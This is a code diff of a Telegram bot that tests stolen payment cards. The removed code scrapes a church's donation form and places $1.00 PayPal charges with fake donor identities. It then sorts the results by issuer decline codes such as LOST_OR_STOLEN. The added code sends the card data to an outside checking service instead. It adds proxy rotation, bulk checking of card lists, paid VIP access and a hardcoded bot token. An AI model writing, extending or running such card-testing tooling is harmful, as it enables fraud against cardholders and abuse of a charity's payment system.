@@ -5,11 +5,6 @@ import random
 import string
 import asyncio
 import httpx
-import requests, base64
-from fake_useragent import UserAgent
-from requests_toolbelt.multipart.encoder import MultipartEncoder
-from faker import Faker
-from urllib.parse import urlparse
 from telegram import Update
 from telegram.ext import (
     Application, CommandHandler, MessageHandler, filters, ContextTypes
@@ -17,317 +12,30 @@ from telegram.ext import (
 
 TOKEN = '7834120140:AAHL1Tn-FSgYnyuYeP3jQ-LhfRqMMDHNr9w'
 
-# ------------------- PayPal Gateway Class -------------------
-class PayPal:
-        def __init__(self, url='https://rhapsody.christembassydallas.org'):
-                self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
-                self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
-                parsed = urlparse(url)
-                domain = parsed.netloc
-                path = parsed.path
-                self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
-                self.donation = "1.00"
-                self.url = domain
-                self.inurl = path
-                self.email = f"{random.choice(self.first_name)}{random.choice(self.last_name)}{random.randint(100,999)}@gmail.com"
-                self.r = requests.Session()
-                self.uu = UserAgent()
+# ------------------- System Configurations -------------------
 
-        def Key(self):
-                he1 = {
-                        'upgrade-insecure-requests': '1',
-                        'user-agent': self.uu.random,
-                }
-                r1 = self.r.get(f'https://{self.url}{self.inurl}', headers=he1, )
-                
-                # إصلاح Regex ليكون أكثر مرونة ويمنع أخطاء NoneType
-                f1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r1.text)
-                f2 = re.search(r'name="give-form-id" value="(.*?)"', r1.text)
-                h1 = re.search(r'name="give-form-hash" value="(.*?)"', r1.text)
-                c1 = re.search(r'"data-client-token":"(.*?)"', r1.text)
-                
-                if not (f1 and f2 and h1 and c1):
-                    raise Exception("Page data not found (Possible protection or change in structure)")
-                
-                self.id_form1 = f1.group(1)
-                self.id_form2 = f2.group(1)
-                self.nonec = h1.group(1)
-                enc = c1.group(1)
-                
-                dec = base64.b64decode(enc).decode('utf-8')
-                self.au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
-                return self.au, self.id_form1, self.id_form2, self.nonec
-
-        def Krs(self, ccx):
-                ccx=ccx.strip()
-                n = ccx.split("|")[0]
-                mm = ccx.split("|")[1]
-                yy = ccx.split("|")[2]
-                cvc = ccx.split("|")[3].strip()
-                if "20" in yy:
-                        yy = yy.split("20")[1]
-                he2 = {
-                        'user-agent': self.uu.random,
-                        'x-requested-with': 'XMLHttpRequest',
-                }
-
-                da1 = {
-                    'give-honeypot': '',
-                    'give-form-id-prefix': self.id_form1,
-                    'give-form-id': self.id_form2,
-                    'give-form-title': 'Make a One-off Donation',
-                    'give-current-url': f'https://{self.url}{self.inurl}',
-                    'give-form-url': f'https://{self.url}{self.inurl}',
-                    'give-form-minimum': self.donation,
-                    'give-form-maximum': '50000',
-                    'give-form-hash': self.nonec,
-                    'give-price-id': 'custom',
-                    'give-recurring-logged-in-only': '',
-                    'give-logged-in-only': self.donation,
-                    'give_recurring_donation_details': '{"is_recurring":false}',
-                    'give-amount': self.donation,
-                    'give_stripe_payment_method': '',
-                    'payment-mode': 'paypal-commerce',
-                    'give_first': random.choice(self.first_name),
-                    'give_last': random.choice(self.last_name),
-                    'give_email': self.email,
-                    'card_name': 'msms',
-                    'card_exp_month': '',
-                    'card_exp_year': '',
-                    'give_gift_check_is_billing_address': 'no',
-                    'give_gift_aid_address_option': 'billing_address',
-                    'give_gift_aid_card_first_name': '',
-                    'give_gift_aid_card_last_name': '',
-                    'give_gift_aid_billing_country': 'GB',
-                    'give_gift_aid_card_address': '',
-                    'give_gift_aid_card_address_2': '',
-                    'give_gift_aid_card_city': '',
-                    'give_gift_aid_card_state': '',
-                    'give_gift_aid_card_zip': '',
-                    'give_action': 'purchase',
-                    'give-gateway': 'paypal-commerce',
-                    'action': 'give_process_donation',
-                    'give_ajax': 'true',
-                }
-
-                r2 = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', headers=he2, data=da1, )
-
-                da2 = MultipartEncoder({
-                    'give-honeypot': (None, ''),
-                    'give-form-id-prefix': (None, self.id_form1),
-                    'give-form-id': (None, self.id_form2),
-                    'give-form-title': (None, 'Make a One-off Donation'),
-                    'give-current-url': (None, f'https://{self.url}{self.inurl}',),
-                    'give-form-url': (None, f'https://{self.url}{self.inurl}',),
-                    'give-form-minimum': (None, '1'),
-                    'give-form-maximum': (None, '50000'),
-                    'give-form-hash': (None, self.nonec),
-                    'give-price-id': (None, 'custom'),
-                    'give-recurring-logged-in-only': (None, ''),
-                    'give-logged-in-only': (None, '1'),
-                    'give_recurring_donation_details': (None, '{"is_recurring":false}'),
-                    'give-amount': (None, '1'),
-                    'give_stripe_payment_method': (None, ''),
-                    'payment-mode': (None, 'paypal-commerce'),
-                    'give_first': (None, random.choice(self.first_name)),
-                    'give_last': (None, random.choice(self.last_name)),
-                    'give_email': (None, self.email),
-                    'card_name': (None, 'ali'),
-                    'card_exp_month': (None, ''),
-                    'card_exp_year': (None, ''),
-                   'give_gift_check_is_billing_address': (None, 'no'),
-                    'give_gift_aid_address_option': (None, 'billing_address'),
-                    'give_gift_aid_card_first_name': (None, ''),
-                    'give_gift_aid_card_last_name': (None, ''),
-                    'give_gift_aid_billing_country': (None, 'GB'),
-                    'give_gift_aid_card_address': (None, ''),
-                    'give_gift_aid_card_address_2': (None, ''),
-                    'give_gift_aid_card_city': (None, ''),
-                    'give_gift_aid_card_state': (None, ''),
-                    'give_gift_aid_card_zip': (None, ''),
-                    'give-gateway': (None, 'paypal-commerce'),
-                })
-
-                he3 = {
-                    'accept': '*/*',
-                    'content-type': da2.content_type,
-                    'user-agent': self.uu.random,
-                }
-
-                pa1 = {
-                    'action': 'give_paypal_commerce_create_order',
-                }
-
-                r3 = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', params=pa1,headers=he3,data=da2, ).json()['data']['id']
-
-
-                he4 = {
-                    'authority': 'cors.api.paypal.com',
-                    'accept': '*/*',
-                    'authorization': f'Bearer {self.au}',
-                    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
-                    'paypal-client-metadata-id': self.paypal,
-                    'user-agent': self.uu.random,
-                }
-
-                da3 = {
-                    'payment_source': {
-                        'card': {
-                            'number': n,
-                            'expiry': f'20{yy}-{mm}',
-                            'security_code': cvc,
-                            'attributes': {
-                                'verification': {
-                                    'method': 'SCA_WHEN_REQUIRED',
-                                },
-                            },
-                        },
-                    },
-                    'application_context': {
-                        'vault': False,
-                    },
-                }
-
-                r4 = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{r3}/confirm-payment-source', headers=he4, json=da3, )
-
-
-                da4=MultipartEncoder({
-                    'give-honeypot': (None, ''),
-                    'give-form-id-prefix': (None, self.id_form1),
-                    'give-form-id': (None, self.id_form2),
-                    'give-form-title': (None, 'Make a One-off Donation'),
-                    'give-current-url': (None, f'https://{self.url}{self.inurl}'),
-                    'give-form-url': (None, f'https://{self.url}{self.inurl}'),
-                    'give-form-minimum': (None, '1'),
-                    'give-form-maximum': (None, '50000'),
-                    'give-form-hash': (None, self.nonec),
-                    'give-price-id': (None, 'custom'),
-                    'give-recurring-logged-in-only': (None, ''),
-                    'give-logged-in-only': (None, self.donation),
-                    'give_recurring_donation_details': (None, '{"is_recurring":false}'),
-                    'give-amount': (None, self.donation),
-                    'give_stripe_payment_method': (None, ''),
-                    'payment-mode': (None, 'paypal-commerce'),
-                    'give_first': (None, random.choice(self.first_name)),
-                    'give_last': (None, random.choice(self.last_name)),
-                    'give_email': (None, self.email),
-                    'card_name': (None, 'ali'),
-                    'card_exp_month': (None, ''),
-                    'card_exp_year': (None, ''),
-                    'give_gift_check_is_billing_address': (None, 'no'),
-                    'give_gift_aid_address_option': (None, 'billing_address'),
-                    'give_gift_aid_card_first_name': (None, ''),
-                    'give_gift_aid_card_last_name': (None, ''),
-                    'give_gift_aid_billing_country': (None, 'GB'),
-                    'give_gift_aid_card_address': (None, ''),
-                    'give_gift_aid_card_address_2': (None, ''),
-                    'give_gift_aid_card_city': (None, ''),
-                    'give_gift_aid_card_state': (None, ''),
-                    'give_gift_aid_card_zip': (None, ''),
-                    'give-gateway': (None, 'paypal-commerce'),
-
-                })
-
-                he5 = {
-                    'accept': '*/*',
-                    'content-type': da4.content_type,
-                    'user-agent': self.uu.random,
-                }
-
-                pa2 = {
-                    'action': 'give_paypal_commerce_approve_order',
-                    'order': r3,
-                }
-
-                r5 = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', params=pa2,headers=he5, data=da4, )
-
-                text = r5.text
-                if 'true' in text or 'sucsess' in text:
-                        return 'CHARGE 1.00$'
-                elif 'DO_NOT_HONOR' in text:
-                        return "DO_NOT_HONOR"
-                elif 'ACCOUNT_CLOSED' in text:
-                        return "ACCOUNT_CLOSED"
-                elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
-                        return "PAYER_ACCOUNT_LOCKED_OR_CLOSED"
-                elif 'LOST_OR_STOLEN' in text:
-                        return "LOST_OR_STOLEN"
-                elif 'CVV2_FAILURE' in text:
-                        return "CVV2_FAILURE"
-                elif 'SUSPECTED_FRAUD' in text:
-                        return "SUSPECTED_FRAUD"
-                elif 'INVALID_ACCOUNT' in text:
-                        return "INVALID_ACCOUNT"
-                elif 'REATTEMPT_NOT_PERMITTED' in text:
-                        return "REATTEMPT_NOT_PERMITTED"
-                elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
-                        return "ACCOUNT_BLOCKED_BY_ISSUER"
-                elif 'ORDER_NOT_APPROVED' in text:
-                        return "ORDER_NOT_APPROVED"
-                elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
-                        return "PICKUP_CARD_SPECIAL_CONDITIONS"
-                elif 'PAYER_CANNOT_PAY' in text:
-                        return "PAYER_CANNOT_PAY"
-                elif 'INSUFFICIENT_FUNDS' in text:
-                        return "INSUFFICIENT_FUNDS"
-                elif 'GENERIC_DECLINE' in text:
-                        return "GENERIC_DECLINE"
-                elif 'COMPLIANCE_VIOLATION' in text:
-                        return "COMPLIANCE_VIOLATION"
-                elif 'TRANSACTION_NOT_PERMITTED' in text:
-                        return "TRANSACTION_NOT_PERMITTED"
-                elif 'PAYMENT_DENIED' in text:
-                        return "PAYMENT_DENIED"
-                elif 'INVALID_TRANSACTION' in text:
-                        return "INVALID_TRANSACTION"
-                elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
-                        return "RESTRICTED_OR_INACTIVE_ACCOUNT"
-                elif 'SECURITY_VIOLATION' in text:
-                        return "SECURITY_VIOLATION"
-                elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
-                        return "DECLINED_DUE_TO_UPDATED_ACCOUNT"
-                elif 'INVALID_OR_RESTRICTED_CARD' in text:
-                        return "INVALID_OR_RESTRICTED_CARD"
-                elif 'EXPIRED_CARD' in text:
-                        return "EXPIRED_CARD"
-                elif 'CRYPTOGRAPHIC_FAILURE' in text:
-                        return "CRYPTOGRAPHIC_FAILURE"
-                elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
-                        return "TRANSACTION_CANNOT_BE_COMPLETED"
-                elif 'DECLINED_PLEASE_RETRY' in text:
-                        return "DECLINED_PLEASE_RETRY_LATER"
-                elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
-                        return "TX_ATTEMPTS_EXCEED_LIMIT"
-                else:
-                        try:
-                                result = r5.json()['data']['error']
-                                return result
-                        except:
-                                return "UNKNOWN_ERROR"                                                                       
-                                                                            
-# ------------------- Users -------------------
-
-ADMINS = [6843321125]  # ضع هنا ID الأدمن
-VIP_USERS = {}  # {user_id: expiration_timestamp}
-BANNED_USERS = {}  # {user_id: True}
-ALL_USERS = set()  # كل مستخدم دخل البوت
-GATEWAYS = ['https://rhapsody.christembassydallas.org']
+ADMINS = [6843321125]  
+VIP_USERS = {}         
+BANNED_USERS = {}      
+ALL_USERS = set()      
+GATEWAYS = []          
+PROXIES = []          
 stop_users = {}
 last_check_time = {}
 ANTI_SPAM_SECONDS = 7
-
 user_tasks = {}
+CODES = {}
 
-# ------------------- Codes -------------------
+# ------------------- Async Semaphores -------------------
 
-CODES = {}  # {"WAFA-XXXX-XXXX-XXXX": { ... }}
+api_semaphore = asyncio.Semaphore(6)
 
-# ------------------- BIN Lookup -------------------
+# ------------------- BIN Lookup Processor -------------------
 
 async def get_bin_info(bin_number):
     urls = [
-        f"https://lookup.binlist.net/{bin_number}",
         f"https://bins.antipublic.cc/bins/{bin_number}",
+        f"https://lookup.binlist.net/{bin_number}",
         f"https://bincheck.io/api/{bin_number}"
     ]
     for attempt in range(3):
@@ -353,72 +61,139 @@ async def get_bin_info(bin_number):
             await asyncio.sleep(0.5)
     return "Unknown", "Unknown", "Unknown"
 
-# ------------------- Check API -------------------
+# ------------------- Core API Engine -------------------
 
 async def check_card_api(card_full, gateway_url):
-    try:
-        paypal_checker = PayPal(url=gateway_url)
-        await asyncio.to_thread(paypal_checker.Key)
-        result_raw = await asyncio.to_thread(paypal_checker.Krs, card_full)
-        result = result_raw.lower()
-        if "charge 1.00$" in result or "success" in result:
-            return "approved", result_raw
-        elif "insufficient_funds" in result:
-            return "live", result_raw
-        else:
-            return "declined", result_raw
-    except Exception as e:
-        return "declined", f"Error: {e}"
+    params = {"url": gateway_url, "card": card_full, "amount": 1.00}
+    
+    # إصلاح طريقة تمرير البروكسي في الإصدارات الجديدة من httpx
+    proxy_url = None
+    if PROXIES:
+        proxy_url = random.choice(PROXIES)
+        if not proxy_url.startswith(("http://", "https://")):
+            proxy_url = f"http://{proxy_url}"
 
-# ------------------- Format Response -------------------
+    async with api_semaphore:
+        try:
+            # استخدام 'proxy' بدلاً من 'proxies' المتوافقة مع التحديث الجديد
+            async with httpx.AsyncClient(proxy=proxy_url, timeout=25) as client:
+                r = await client.get("http://gatescheck.duckdns.org:7000/check", params=params)
+                
+                if r.status_code != 200:
+                    return "declined", f"API Error HTTP {r.status_code}"
+                
+                data = r.json()
+                result_raw = data.get('result', '')
+                result = result_raw.lower()
+                
+                if "charge" in result or "success" in result:
+                    return "approved", result_raw
+                elif "insufficient" in result:
+                    return "live", result_raw
+                else:
+                    return "declined", result_raw if result_raw else "Declined"
+        except httpx.TimeoutException:
+            return "declined", "API Timeout"
+        except httpx.RequestError as e:
+            return "declined", f"Network Error"
+        except Exception as e:
+            return "declined", f"System Fault: {str(e)[:40]}"
 
-async def format_response(card_full, status, response, taken):
+# ------------------- Card Format Generator -------------------
+
+async def format_response(card_full, status, response, taken, gateway_url, user_id):
     bin_number = card_full.split("|")[0][:6]
     info, bank, country = await get_bin_info(bin_number)
 
     if status == "approved":
-        status_text = "#Charge 🔥"
+        status_text = "Approved / Charge 🔥💎"
     elif status == "live":
-        status_text = "#Live ✅"
+        status_text = "Live / Insufficient Funds 🟢✨"
     else:
-        status_text = "#Declined ❌"
-    return f"""#PayPal_Custom ($1.00) 🌟 
+        status_text = "Declined / Error ❌"
+        
+    proxy_status = "Active ⚡" if PROXIES else "Off ❌"
+    gate_display = f"\n🔹 𝐆𝐚𝐭e𝐰𝐚𝐲: `{gateway_url}`" if user_id in ADMINS else ""
 
-[ϟ] Card: {card_full}
-[ϟ] Response: {response}
-[ϟ] Status: {status_text}
-[ϟ] Taken: {taken}s
+    return f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+          ⍟ [ 𝐏𝐀𝐘𝐏𝐀𝐋 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 ] ⍟
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+✨ 𝐏𝐚𝐲𝐏𝐚𝐥 𝐂𝐮𝐬𝐭𝐨𝐦 ($1.00) 
 
-[ϟ] Info: {info}
-[ϟ] Bank: {bank}
-[ϟ] Country: {country}
-[⌤] Dev by: Wafa" - 🍀"""
+💳 𝐂𝐚𝐫𝐝: `{card_full}`
+📝 𝐑e𝐬𝐩b𝐧𝐬e: `{response}`
+⚡ 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}{gate_display}
+⏱ 𝐓𝐚𝐤𝐞𝐧: `{taken}s`
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ℹ️ 𝐈𝐧𝐟𝐨: `{info}`
+🏛 𝐁𝐚𝐧𝐤: `{bank}`
+🌍 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: `{country}`
+⚙️ 𝐏𝐫𝐨𝐱𝐲: `{proxy_status}`
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"""
 
-# ------------------- Permissions -------------------
+# ------------------- Guard Systems -------------------
+
+async def check_banned_guard(update: Update) -> bool:
+    user_id = update.effective_user.id
+    if BANNED_USERS.get(user_id):
+        await update.message.reply_text("⚠️ Access Denied: Account restricted from using this service.")
+        return True
+    return False
 
 def can_user_check(user_id, mode="file"):
-    if user_id in ADMINS:
-        return True
-    elif BANNED_USERS.get(user_id):
-        return False
-    elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
-        return True
-    else:
-        return mode == "single"
+    if user_id in ADMINS: return True
+    if BANNED_USERS.get(user_id): return False
+    if user_id in VIP_USERS and VIP_USERS[user_id] > time.time(): return True
+    return mode == "single"
 
-# ------------------- /pp -------------------
+# ------------------- Command /cmds -------------------
+
+async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if await check_banned_guard(update): return
+    
+    commands_text = """┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+         ▬▬▬ [ 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 ] ▬▬▬
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+👑 𝐀𝐃𝐌𝐈𝐍 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:
+• `/add [url]` - Add processing gateway route
+• `/rmadd` - Pop last added gateway
+• `/proxy [ip:port]` - Import active system proxy
+• `/rmproxy` - Flush global proxy list
+• `/ban_user [id]` - Lock account out of bot
+• `/unban_user [id]` - Restore access permissions
+• `/prm [id] [days]` - Manually inject VIP membership
+• `/rmprm [id]` - Clear account VIP status
+• `/wafa [days] [max]` - Generate key token seeds
+• `/show_users` - Fetch entire local user database
+• `/try [id] [msg]` - Broadcast message to specific user
+• `/SENT [msg]` - Broadcast message to all database users
+
+⭐ 𝐕𝐈𝐏 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:
+• [Combo File Upload] - Trigger Mass Multi-Loop System Panel
+
+👥 𝐅𝐑𝐄𝐄 𝐔𝐒𝐄𝐑 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:
+• `/start` - Launch active bot matrix
+• `/cmds` - Access available command parameters
+• `/pp [card]` - Single transactional entry gate
+• `/stop` - Emergency halt file sequence
+• `/code [wafa-key]` - Activate premium redeem vouchers
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
+    await update.message.reply_text(commands_text, parse_mode="Markdown")
+
+# ------------------- Single Card Gate -------------------
 
 async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if await check_banned_guard(update): return
     user_id = update.effective_user.id
     ALL_USERS.add(user_id)
     if not can_user_check(user_id, "single"):
-        await update.message.reply_text("❌ VIP only for single check.")
+        await update.message.reply_text("❌ Operational Error: Premium VIP permissions missing.")
         return
     if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
         now = time.time()
         last = last_check_time.get(user_id, 0)
         if now - last < ANTI_SPAM_SECONDS:
-            await update.message.reply_text(f"❌ Wait {ANTI_SPAM_SECONDS} seconds before next check")
+            await update.message.reply_text(f"⏳ Dynamic throttling active: Wait {ANTI_SPAM_SECONDS} seconds.")
             return
         last_check_time[user_id] = now
     try:
@@ -427,40 +202,42 @@ async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"Error: {e}")
 
 async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
     card_full = " ".join(context.args)
     if not card_full:
-        await update.message.reply_text("Usage:\n/pp 4242424242424242|09|28|123")
+        await update.message.reply_text("💡 𝐔𝐬𝐚𝐠𝐞:\n`/pp 4242424242424242|09|28|123`", parse_mode="Markdown")
         return
-    
     if not GATEWAYS:
-        await update.message.reply_text("❌ No gateways available.")
+        await update.message.reply_text("❌ System Failure: Operational gateways unallocated.")
         return
         
-    start_time = time.time()
-    # استخدام آخر بوابة تمت إضافتها
-    status, response = await check_card_api(card_full, GATEWAYS[-1])
-    taken = round(time.time() - start_time, 2)
-    text = await format_response(card_full, status, response, taken)
-    await update.message.reply_text(text)
+    for gateway in GATEWAYS:
+        start_time = time.time()
+        status, response = await check_card_api(card_full, gateway)
+        taken = round(time.time() - start_time, 2)
+        text = await format_response(card_full, status, response, taken, gateway, user_id)
+        await update.message.reply_text(text, parse_mode="Markdown")
 
-# ------------------- /stop -------------------
+# ------------------- Emergency Interrupt -------------------
 
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if await check_banned_guard(update): return
     user_id = update.effective_user.id
     stop_users[user_id] = True
-    await update.message.reply_text("Stopped ⛔")
+    await update.message.reply_text("🛑 The examination was stopped.")
 
-# ------------------- File Handler -------------------
+# ------------------- Mass File Intermediary -------------------
 
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if await check_banned_guard(update): return
     user_id = update.effective_user.id
     ALL_USERS.add(user_id)
     if not can_user_check(user_id, "file"):
-        await update.message.reply_text("❌ VIP only for file check.")
+        await update.message.reply_text("❌ Execution Refused: File arrays require a Premium subscription tier.")
         return
     if user_id not in ADMINS:
         if user_id in user_tasks and not user_tasks[user_id].done():
-            await update.message.reply_text("❌ Wait until current file finishes")
+            await update.message.reply_text("❌ Busy state detected: Your current queue has not cleared.")
             return
     try:
         task = asyncio.create_task(process_file(update, context))
@@ -468,7 +245,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         await update.message.reply_text(f"Error: {e}")
 
-# ------------------- process_file -------------------
+# ------------------- The Mass Panel Processing Loop -------------------
 
 async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -479,235 +256,240 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         file_path = f"downloads/{file.file_id}.txt"
         await file.download_to_drive(file_path)
 
-        results_file_path = f"downloads/results_{file.file_id}.txt"
         approved = live = declined = 0
         panel_msg = await update.message.reply_text("Start Checking... 🔍")
         with open(file_path, 'r', encoding='utf-8') as f:
             lines = f.readlines()
 
-        async def process_line(line):
-            nonlocal approved, live, declined
-            try:
-                match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
-                if not match:
-                    return
-                card_full = match[0]
-                
-                if not GATEWAYS:
-                    return
-                    
-                start_time = time.time()
-                status, response = await check_card_api(card_full, GATEWAYS[-1])
-                await asyncio.sleep(random.uniform(0, 1))
-                taken = round(time.time() - start_time, 2)
-                text = await format_response(card_full, status, response, taken)
-                if status == "approved":
-                    approved += 1
-                    await update.message.reply_text(text)
-                elif status == "live":
-                    live += 1
-                    await update.message.reply_text(text)
-                else:
-                    declined += 1
-                last_info, last_bank, last_country = await get_bin_info(card_full.split("|")[0][:6])
-                panel = f"""📊 Status 
-
-✅ Charge: {approved} 💥
-🟢 Live: {live} 💫
-❌ Declined: {declined}
-📂 Total: {approved + live + declined}
-
-━━━━━━━━━━━━━━━
-💳 Last Card: {card_full}
-📨 Response: {response}
-🏦 Info: {last_info}
-🏛 Bank: {last_bank}
-🌍 Country: {last_country}
-📌 Status: {status}
-━━━━━━━━━━━━━━━
-
-⛔ Stop: {'ON' if stop_users.get(user_id) else 'OFF'}"""
-                try:
-                    await panel_msg.edit_text(panel)
-                except:
-                    pass
-                return text
-            except Exception as e:
-                print(f"Line Error: {e}")
-                return None
-
         for line in lines:
             if stop_users.get(user_id):
-                await update.message.reply_text("Stopped ⛔")
+                await update.message.reply_text("🛑 The examination was stopped.")
                 return
-            try:
-                await process_line(line)
-            except Exception as e:
-                print(f"Loop Error: {e}")
-                continue
+                
+            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
+            if not match: continue
+            card_full = match[0]
+            
+            if not GATEWAYS:
+                await update.message.reply_text("❌ Engine Failure: Operational gateways empty.")
+                return
+                
+            for gateway in GATEWAYS:
+                if stop_users.get(user_id): break
+                    
+                start_time = time.time()
+                status, response = await check_card_api(card_full, gateway)
+                await asyncio.sleep(random.uniform(0.5, 1.5))
+                taken = round(time.time() - start_time, 2)
+                text = await format_response(card_full, status, response, taken, gateway, user_id)
+                
+                if status == "approved":
+                    approved += 1
+                    await update.message.reply_text(text, parse_mode="Markdown")
+                elif status == "live":
+                    live += 1
+                    await update.message.reply_text(text, parse_mode="Markdown")
+                else:
+                    declined += 1
+                    
+                last_info, last_bank, last_country = await get_bin_info(card_full.split("|")[0][:6])
+                proxy_status = "Active ⚡" if PROXIES else "Off ❌"
+                gate_info = f"\n🌐 𝐆𝐚𝐭𝐞: `{gateway}`" if user_id in ADMINS else ""
 
-        await update.message.reply_text(f"Done ✅")
+                panel = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━裝
+         ▬▬ [ 𝐌𝐀𝐒𝐒 𝐏𝐀𝐘𝐏𝐀𝐋 ] ▬▬
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+✅ 𝐂𝐡𝐚𝐫𝐠𝐞: `{approved}` 💎
+🟢 𝐋𝐢𝐯𝐞: `{live}` 🔋
+❌ 𝐃e𝐜𝐥𝐢𝐧e𝐝: `{declined}`
+📂 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩𝐬: `{approved + live + declined}`
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💳 𝐋𝐚𝐬𝐭 𝐂𝐚𝐫𝐝: `{card_full}`
+📝 𝐑e𝐬𝐩b𝐧𝐬e: `{response}`{gate_info}
+ℹ️ 𝐈𝐧𝐟𝐨: `{last_info}`
+🏛 𝐁𝐚𝐧𝐤: `{last_bank}`
+🌍 𝐂b𝐮𝐧𝐭𝐫𝐲: `{last_country}`
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🛑 𝐒𝐭b𝐩: `{'ON' if stop_users.get(user_id) else 'OFF'}` | ⚙️ 𝐏r𝐨𝐱𝐲: `{proxy_status}`"""
+                try:
+                    await panel_msg.edit_text(panel, parse_mode="Markdown")
+                except:
+                    pass
+
+        await update.message.reply_text("✅ Success: Mass transaction loops executed completely.")
 
     except Exception as e:
-        await update.message.reply_text(f"❌ Error: {e}")
+        await update.message.reply_text(f"❌ Structural Fault: {e}")
 
-# ------------------- ERROR HANDLER -------------------
+# ------------------- Error Tracker -------------------
 
 async def error_handler(update, context):
-    print(f"Global Error: {context.error}")
+    print(f"Exception Logged: {context.error}")
 
-# ------------------- /try -------------------
+# ------------------- Proxy Methods -------------------
+
+async def add_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if await check_banned_guard(update): return
+    if update.effective_user.id not in ADMINS:
+        return await update.message.reply_text("❌ Unauthorized Command Set.")
+    if not context.args:
+        return await update.message.reply_text("💡 Usage:\n`/proxy ip:port` or `user:pass@ip:port`", parse_mode="Markdown")
+    proxy = context.args[0]
+    if proxy not in PROXIES:
+        PROXIES.append(proxy)
+        await update.message.reply_text(f"🚀 𝐏𝐫b𝐱𝐲 𝐈𝐦𝐩b𝐫𝐭e𝐝: `{proxy}`", parse_mode="Markdown")
+    else:
+        await update.message.reply_text("❌ Alert: Proxy string signature duplicate.")
+
+async def remove_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if await check_banned_guard(update): return
+    if update.effective_user.id not in ADMINS:
+        return await update.message.reply_text("❌ Unauthorized Command Set.")
+    if not PROXIES:
+        return await update.message.reply_text("❌ Wipe Fault: Proxy dynamic dictionary empty.")
+    removed = PROXIES.pop()
+    await update.message.reply_text(f"🗑 𝐏𝐫b𝐱𝐲 𝐖𝐢𝐩e𝐝: `{removed}`", parse_mode="Markdown")
+
+# ------------------- Administration Subsystem -------------------
 
 async def try_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id not in ADMINS:
-        return
+    if await check_banned_guard(update): return
+    if update.effective_user.id not in ADMINS: return
     try:
         user_id = int(context.args[0])
         reply_text = " ".join(context.args[1:])
         await context.bot.send_message(chat_id=user_id, text=reply_text)
-        await update.message.reply_text("✅ Sent")
+        await update.message.reply_text("✅ Dynamic message routed through proxy wrapper.")
     except:
-        await update.message.reply_text("❌ Usage:\n/try 123456789 hello")
+        await update.message.reply_text("❌ Syntax: `/try USER_ID message`")
 
-# ------------------- /code -------------------
+async def sent_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if await check_banned_guard(update): return
+    if update.effective_user.id not in ADMINS: return
+    if not context.args:
+        return await update.message.reply_text("❌ Syntax: `/SENT Your announcement message here`")
+    
+    broadcast_msg = " ".join(context.args)
+    count = 0
+    for user_id in list(ALL_USERS):
+        try:
+            await context.bot.send_message(chat_id=user_id, text=f"📢 𝐒𝐘𝐒𝐓𝐄𝐌 𝐀𝐍𝐍𝐎𝐔𝐍𝐂𝐄𝐌𝐄𝐍𝐓:\n\n{broadcast_msg}")
+            count += 1
+            await asyncio.sleep(0.05)
+        except:
+            continue
+    await update.message.reply_text(f"✅ Broadcast complete. Message pushed to `{count}` users.", parse_mode="Markdown")
 
 async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
